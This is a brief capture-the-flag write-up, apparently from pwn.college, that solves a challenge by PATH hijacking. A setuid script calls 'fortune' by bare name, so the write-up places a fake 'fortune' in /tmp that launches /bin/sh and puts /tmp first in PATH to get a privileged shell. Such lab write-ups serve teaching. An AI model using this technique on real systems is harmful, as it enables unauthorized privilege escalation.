Source: pwncollege

Tags: [[Symbolic links]]

We see a program with suid bit set, on using cat cmd on the program we see
```sh
#!/opt/pwncollege/sh

fortune 
```

Create a file in tmp & name it fortune 
```sh
#!/bin/bash

/bin/sh
```
`Chmod 777 fortune `to make it executable 

Then add this to the path
```
export PATH=/tmp:$PATH
```
Then go to challenge directory and run the program 

### References

Arizona CTF 2025